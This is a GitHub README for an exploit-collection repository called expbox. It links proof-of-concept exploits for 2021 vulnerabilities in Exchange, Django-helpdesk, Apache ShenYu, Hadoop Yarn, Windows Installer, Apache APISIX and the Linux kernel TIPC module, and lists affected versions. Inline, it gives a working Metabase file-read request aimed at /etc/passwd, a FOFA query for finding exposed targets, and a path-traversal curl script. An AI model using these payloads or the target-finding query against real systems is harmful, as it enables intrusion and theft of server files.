![[object Object]](https://socialify.git.ci/0x0021h/expbox/image?description=1&name=1&stargazers=1&theme=Light)

### Introduction
expbox is an exploit code collection repository


### List
[CVE-2021-41349 Exchange XSS PoC](https://github.com/0x0021h/expbox/blob/main/cve-2021-41349-poc.py)
```
<= Exchange 2013 update 23
<= Exchange 2016 update 22
<= Exchange 2019 update 11
```
[CVE-2021–3945 Django-helpdesk stored XSS PoC](https://github.com/0x0021h/expbox/blob/main/cve-2021%E2%80%933945-poc.txt)
```
<= 0.3.0
```

[CVE-2021-37580 Apache ShenYu 2.3.0/2.4.0 authentication bypass](https://github.com/0x0021h/expbox/blob/main/cve-2021-37580-poc.py)
```
Ref: https://github.com/fengwenhua/CVE-2021-37580
```


[Hadoop Yarn RPC RCE](https://github.com/0x0021h/expbox/blob/main/Hadoop%20Yarn%20RPC%20RCE.md)
```
Ref: https://github.com/cckuailong/YarnRpcRCE
```

[CVE-2021-41277 MetaBase Arbitrary File Read](https://github.com/0x0021h/expbox/blob/main/CVE-2021-41277.yaml)
```
MetaBase < 0.40.5
1.0.0 <= MetaBase < 1.40.5

FOFA:

app="Metabase"

PoC:

GET /api/geojson?url=file:/etc/passwd HTTP/1.1
```

[CVE-2021-42321 Exchange Post-Auth RCE](https://github.com/0x0021h/expbox/blob/main/CVE-2021-42321.py)
```
<= Exchange 2016 update 22
<= Exchange 2019 update 11
```

[Windows 0day](https://github.com/0x0021h/expbox/blob/main/InstallerFileTakeOver.exe)
![image](https://user-images.githubusercontent.com/92664048/142796024-a46e8a46-90d1-42ed-8cf2-42127fb65da3.png)
```
Ref:https://github.com/klinix5/InstallerFileTakeOver
```

CVE-2021-43557 Apache APISIX: Path traversal in request_uri variable
```
#/bin/bash

kubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H 'Host: app.test'
```

[CVE-2021-43267 Linux Kernel TIPC RCE](https://github.com/0x0021h/expbox/blob/main/CVE-2021-43267.c)
```
5.10-rc1 < Linux kernel < 5.15
```

Reference: https://haxx.in/posts/pwning-tipc/

### Note

All content comes from the Internet, if there is a copyright problem, please contact me to delete.
